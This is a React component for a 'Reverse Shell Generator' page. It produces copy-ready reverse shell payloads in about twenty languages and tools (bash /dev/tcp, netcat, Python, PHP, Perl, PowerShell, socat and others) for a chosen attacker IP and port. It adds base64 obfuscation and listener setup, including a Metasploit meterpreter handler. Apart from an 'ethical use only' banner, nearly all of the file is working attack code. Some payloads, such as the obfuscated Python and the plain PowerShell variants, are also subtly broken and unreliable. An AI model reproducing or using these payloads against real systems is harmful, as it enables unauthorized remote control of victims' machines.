import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Copy, Check, Terminal, Shield } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Switch } from "@/components/ui/switch";

const ReverseShellGenerator = () => {
    const [ip, setIp] = useState("");
    const [port, setPort] = useState("4444");
    const [shell, setShell] = useState("/bin/bash");
    const [obfuscate, setObfuscate] = useState(false);
    const [copied, setCopied] = useState<string | null>(null);

    const handleCopy = (command: string, id: string) => {
        navigator.clipboard.writeText(command);
        setCopied(id);
        toast({
            title: "Copied!",
            description: "Shell command copied to clipboard",
        });
        setTimeout(() => setCopied(null), 2000);
    };

    // Shell generation functions
    const bashTcp = () => {
        if (obfuscate) {
            const b64 = btoa(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
            return `echo ${b64} | base64 -d | bash`;
        }
        return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    };

    const bashUdp = () => {
        return `bash -i >& /dev/udp/${ip}/${port} 0>&1`;
    };

    const netcatTraditional = () => {
        return `nc -e ${shell} ${ip} ${port}`;
    };

    const netcatBsd = () => {
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`;
    };

    const pythonShell = () => {
        const code = `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${shell}","-i"])`;
        if (obfuscate) {
            return `python -c '${btoa(code)}' | base64 -d | python`;
        }
        return `python -c '${code}'`;
    };

    const pythonShortShell = () => {
        return `python -c 'import socket,subprocess;s=socket.socket();s.connect(("${ip}",${port}));subprocess.call(["${shell}","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'`;
    };

    const python3Shell = () => {
        const code = `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${shell}","-i"])`;
        return `python3 -c '${code}'`;
    };

    const phpExec = () => {
        return `php -r '$sock=fsockopen("${ip}",${port});exec("${shell} -i <&3 >&3 2>&3");'`;
    };

    const phpShell = () => {
        return `php -r '$sock=fsockopen("${ip}",${port});shell_exec("${shell} -i <&3 >&3 2>&3");'`;
    };

    const phpSystem = () => {
        return `php -r '$sock=fsockopen("${ip}",${port});system("${shell} -i <&3 >&3 2>&3");'`;
    };

    const perlShell = () => {
        return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`;
    };

    const rubyShell = () => {
        return `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'`;
    };

    const golangShell = () => {
        return `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("${shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`;
    };

    const powershellShell = () => {
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    };

    const powershellBase64 = () => {
        const cmd = `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
        const b64 = btoa(cmd);
        return `powershell -enc ${b64}`;
    };

    const awkShell = () => {
        return `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
    };

    const socat = () => {
        return `socat TCP:${ip}:${port} EXEC:${shell}`;
    };

    const nodejsShell = () => {
        return `node -e '(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("${shell}", []);var client = new net.Socket();client.connect(${port}, "${ip}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'`;
    };

    const javaShell = () => {
        return `r = Runtime.getRuntime()\np = r.exec(["${shell}","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`;
    };

    const telnetShell = () => {
        return `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | ${shell} 1>$TF`;
    };

    const rustShell = () => {
        return `use std::net::TcpStream;use std::process::{Command, Stdio};use std::io::{Read, Write};let mut stream = TcpStream::connect("${ip}:${port}").unwrap();let mut child = Command::new("${shell}").stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();`;
    };

    const shells = [
        { id: "bash-tcp", name: "Bash TCP", lang: "bash", fn: bashTcp },
        { id: "bash-udp", name: "Bash UDP", lang: "bash", fn: bashUdp },
        { id: "nc-traditional", name: "Netcat Traditional", lang: "bash", fn: netcatTraditional },
        { id: "nc-bsd", name: "Netcat BSD", lang: "bash", fn: netcatBsd },
        { id: "python", name: "Python", lang: "python", fn: pythonShell },
        { id: "python-short", name: "Python Short", lang: "python", fn: pythonShortShell },
        { id: "python3", name: "Python 3", lang: "python", fn: python3Shell },
        { id: "php-exec", name: "PHP exec()", lang: "php", fn: phpExec },
        { id: "php-shell", name: "PHP shell_exec()", lang: "php", fn: phpShell },
        { id: "php-system", name: "PHP system()", lang: "php", fn: phpSystem },
        { id: "perl", name: "Perl", lang: "perl", fn: perlShell },
        { id: "ruby", name: "Ruby", lang: "ruby", fn: rubyShell },
        { id: "golang", name: "Golang", lang: "go", fn: golangShell },
        { id: "powershell", name: "PowerShell", lang: "powershell", fn: powershellShell },
        { id: "powershell-b64", name: "PowerShell Base64", lang: "powershell", fn: powershellBase64 },
        { id: "awk", name: "AWK", lang: "bash", fn: awkShell },
        { id: "socat", name: "Socat", lang: "bash", fn: socat },
        { id: "nodejs", name: "Node.js", lang: "javascript", fn: nodejsShell },
        { id: "java", name: "Java", lang: "java", fn: javaShell },
        { id: "telnet", name: "Telnet", lang: "bash", fn: telnetShell },
    ];

    const listenerCommands = {
        netcat: `nc -lvnp ${port}`,
        netcatVerbose: `nc -lvnp ${port} -v`,
        socat: `socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`,
        powercat: `powercat -l -p ${port} -v`,
        ncat: `ncat -lvnp ${port} --ssl`,
        metasploit: `use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST ${ip}\nset LPORT ${port}\nexploit`,
    };

    return (
        <div className="container mx-auto py-8 px-4">
            <div className="mb-8">
                <h1 className="text-4xl font-bold mb-2 flex items-center gap-2">
                    <Terminal className="w-8 h-8" />
                    Reverse Shell Generator
                </h1>
                <p className="text-muted-foreground">
                    Generate reverse shell payloads for various languages and platforms
                </p>
            </div>

            <Alert className="mb-6 border-yellow-500/50 bg-yellow-500/10">
                <Shield className="h-4 w-4" />
                <AlertTitle>Ethical Use Only</AlertTitle>
                <AlertDescription>
                    These tools are for authorized penetration testing only. Unauthorized access to computer systems is illegal.
                    Always obtain proper authorization before testing.
                </AlertDescription>
            </Alert>

            <Card className="mb-6">
                <CardHeader>
                    <CardTitle>Configuration</CardTitle>
                    <CardDescription>Set your listener IP and port</CardDescription>
                </CardHeader>
                <CardContent>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <Label htmlFor="ip">Listener IP</Label>
                            <Input
                                id="ip"
                                placeholder="10.10.14.5"
                                value={ip}
                                onChange={(e) => setIp(e.target.value)}
                            />
                        </div>
                        <div>
                            <Label htmlFor="port">Listener Port</Label>
                            <Input
                                id="port"
                                placeholder="4444"
                                value={port}
                                onChange={(e) => setPort(e.target.value)}
                            />
                        </div>
                        <div>
                            <Label htmlFor="shell">Shell</Label>
                            <Select value={shell} onValueChange={setShell}>
                                <SelectTrigger>
                                    <SelectValue />
                                </SelectTrigger>
                                <SelectContent>
                                    <SelectItem value="/bin/bash">/bin/bash</SelectItem>
                                    <SelectItem value="/bin/sh">/bin/sh</SelectItem>
                                    <SelectItem value="/bin/zsh">/bin/zsh</SelectItem>
                                    <SelectItem value="cmd.exe">cmd.exe</SelectItem>
                                    <SelectItem value="powershell.exe">powershell.exe</SelectItem>
                                </SelectContent>
                            </Select>
                        </div>
                    </div>
                    <div className="flex items-center space-x-2 mt-4">
                        <Switch id="obfuscate" checked={obfuscate} onCheckedChange={setObfuscate} />
                        <Label htmlFor="obfuscate">Base64 obfuscation (where supported)</Label>
                    </div>
                </CardContent>
            </Card>

            <Tabs defaultValue="shells" className="w-full">
                <TabsList>
                    <TabsTrigger value="shells">Reverse Shells</TabsTrigger>
                    <TabsTrigger value="listeners">Listener Setup</TabsTrigger>
                </TabsList>

                <TabsContent value="shells" className="space-y-4">
                    {!ip || !port ? (
                        <Alert>
                            <AlertDescription>
                                Please enter your listener IP and port in the configuration above to generate shells.
                            </AlertDescription>
                        </Alert>
                    ) : (
                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                            {shells.map((shell) => {
                                const command = shell.fn();
                                return (
                                    <Card key={shell.id}>
                                        <CardHeader>
                                            <CardTitle className="text-lg flex items-center justify-between">
                                                {shell.name}
                                                <Button
                                                    size="sm"
                                                    variant="ghost"
                                                    onClick={() => handleCopy(command, shell.id)}
                                                >
                                                    {copied === shell.id ? (
                                                        <Check className="w-4 h-4" />
                                                    ) : (
                                                        <Copy className="w-4 h-4" />
                                                    )}
                                                </Button>
                                            </CardTitle>
                                        </CardHeader>
                                        <CardContent>
                                            <div className="relative">
                                                <pre className="bg-muted p-3 rounded-lg overflow-x-auto text-xs font-mono">
                                                    <code>{command}</code>
                                                </pre>
                                            </div>
                                        </CardContent>
                                    </Card>
                                );
                            })}
                        </div>
                    )}
                </TabsContent>

                <TabsContent value="listeners">
                    <Card>
                        <CardHeader>
                            <CardTitle>Listener Commands</CardTitle>
                            <CardDescription>
                                Set up your listener on the attacking machine before executing the reverse shell
                            </CardDescription>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            {Object.entries(listenerCommands).map(([key, command]) => (
                                <div key={key} className="space-y-2">
                                    <div className="flex items-center justify-between">
                                        <Label className="text-base capitalize">{key.replace(/([A-Z])/g, " $1")}</Label>
                                        <Button
                                            size="sm"
                                            variant="ghost"
                                            onClick={() => handleCopy(command, key)}
                                        >
                                            {copied === key ? (
                                                <Check className="w-4 h-4" />
                                            ) : (
                                                <Copy className="w-4 h-4" />
                                            )}
                                        </Button>
                                    </div>
                                    <Textarea
                                        value={command}
                                        readOnly
                                        className="font-mono text-sm bg-muted"
                                        rows={command.split("\n").length}
                                    />
                                </div>
                            ))}
                        </CardContent>
                    </Card>
                </TabsContent>
            </Tabs>
        </div>
    );
};

export default ReverseShellGenerator;
